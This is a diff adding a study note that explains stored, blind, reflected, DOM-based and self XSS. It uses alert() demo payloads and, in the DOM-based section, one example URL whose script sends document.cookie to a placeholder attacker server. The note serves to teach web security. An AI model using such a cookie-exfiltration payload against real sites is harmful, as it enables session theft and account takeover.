@@ -1,0 +1,61 @@
+- There are three kinds of XSS: stored XSS, reflected XSS, and DOM-based XSS
+
+1- Stored XSS :
+
+- Stored XSS happens when user input is stored on a server and retrieved unsafely. When an application accepts user input without validation, stores
+it in its servers, and then renders it on users’ browsers without sanitization, malicious JavaScript code can make its way into the database and then to victims’ browsers
+
+- Stored XSS is the most severe XSS type, Sometimes during a stored-XSS attack, all the user has to do to become a victim is to view a page with the payload embedded, whereas reflected and DOM XSS usually require the user to click a malicious link. Finally, self-XSS requires a lot of social engineering to succeed.
+
+- During a stored XSS attack, attackers manage to permanently save their malicious scripts on the target application’s servers for others to access. Perhaps they’re able to inject the script in the application’s user database. Or maybe they get it in the server logs, on a message board, or in comment field. Every time users access the stored information, the XSS executes in their browser
+
+- For example, let’s say a comment field on an internet forum is vulnerable to XSS. When a user submits a comment to a blog post, that user input
+is not validated or sanitized in any way before it gets rendered to anyone who views that blog post
+<script>alert('XSS by Vickie');</script>
+
+- If submitted, this message would become embedded on the forum page’s HTML code, and the page would be displayed to all the visitors who view that
+comment:
+<h2>Vickie's message</h2>
+<p>What a great post! Thanks for sharing.</p>
+<h2>Attacker's message</h2>
+<p><script>alert('XSS by Vickie');</script></p>
+
+- When you load this HTML page in your browser, you’ll see the attacker’s comment field displayed as blank. This is because your browser interpreted
+<script>alert('XSS by Vickie');</script> located in the <p> tags as a script, not as regular text. You should notice a pop-up window that reads XSS by Vickie. Every time a user views the comment on the forum, their browser will execute the embedded JavaScript. Stored XSS tends to be the most dangerous because attackers can attack many victims with a single payload.
+
+- Blind XSS -> Blind XSS vulnerabilities are stored XSS vulnerabilities whose malicious input is stored by the server and executed in another part of the application or in another application that you cannot see. For example, let’s say that a page on example.com allows you to send a message to the site’s support staff. When a user submits a message, that input is not validated or sanitized in any way before it gets rendered to the
+site’s admin page. An attacker can submit a message with JavaScript code and have that code executed by any admin who views that message.
+These XSS flaws are harder to detect, since you can’t find them by looking for reflected input in the server’s response, but they can be just as
+dangerous as regular stored XSS vulnerabilities. Often, blind XSS can be used to attack administrators, exfiltrate their data, and compromise their
+accounts.
+
+2- Reflected XSS :
+
+- Reflected XSS vulnerabilities happen when user input is returned to the user without being stored in a database. The application takes in user input, processes it server-side, and immediately returns it to the user
+
+- If the search functionality displays any user-submitted search string on the results page, a search term like the following would cause a script to become embedded on the results page and executed by the browser:
+https://example.com/search?q=<script>alert('XSS by Vickie');</script>
+
+- If an attacker can trick victims into visiting this URL, the payload will become embedded in their version of the page, making the victim’s browser run whatever code the attacker would like. Unlike stored XSS, which allows attackers to execute code on anyone who accesses their stored resources, reflected XSS enables attackers to execute code on the browsers of victims who click their malicious links.
+
+3- DOM-Based XSS : 
+
+- DOM-based XSS is similar to reflected XSS, except that in DOM-based XSS, the user input never leaves the user’s browser. In DOM-based XSS, the
+application takes in user input, processes it on the victim’s browser, and then returns it to the user
+
+- The Document Object Model (DOM) is a model that browsers use to render a web page. The DOM represents a web page’s structure; it defines the basic
+properties and behavior of each HTML element, and helps scripts access and modify the contents of the page. DOM-based XSS targets a web page’s DOM directly: it attacks the client’s local copy of the web page instead of going through the server. Attackers are able to attack the DOM when a page takes user-supplied data and dynamically alters the DOM based on that input. JavaScript libraries like jQuery are prone to DOM-based XSS since they dynamically alter DOM elements.
+
+- As in reflected XSS, attackers submit DOM-based XSS payloads via the victim’s user input. Unlike reflected XSS, a DOM-based XSS script doesn’t
+require server involvement, because it executes when user input modifies the source code of the page in the browser directly. The XSS script is never sent to the server, so the HTTP response from the server won’t change
+
+- The URL parameter isn’t submitted to the server. Instead, it’s used locally, by the user’s browser, to construct a web page by using a client-side
+script. But if the website doesn’t validate the user-submitted locale parameter, an attacker can trick users into visiting a URL like this one:
+https://example.com?locale=<script>location='http://attacker_server_ip/?c='+document.cookie;</script>
+
+- The site will embed the payload on the user’s web page, and the victim’s browser will execute the malicious script. DOM XSS may sound a lot like reflected XSS at first. The difference is that the reflected XSS payload gets sent to the server and returned to the user’s browser within an HTTP response. On the other hand, the DOM XSS payload is injected onto a page because of client-side code rendering user input in an insecure manner. Although the results of the two attacks are similar, the processes of testing for them and protecting against them are different.
+
+- Self-XSS -> Self-XSS attacks require victims to input a malicious payload themselves. To perform these, attackers must trick users into doing much more than simply viewing a page or browsing to a particular URL, If you’ve ever seen social media posts or text messages telling you to paste
+a piece of code into your browser to “do something cool,” it was probably attack code aimed at tricking you into launching self-XSS against yourself
+
+
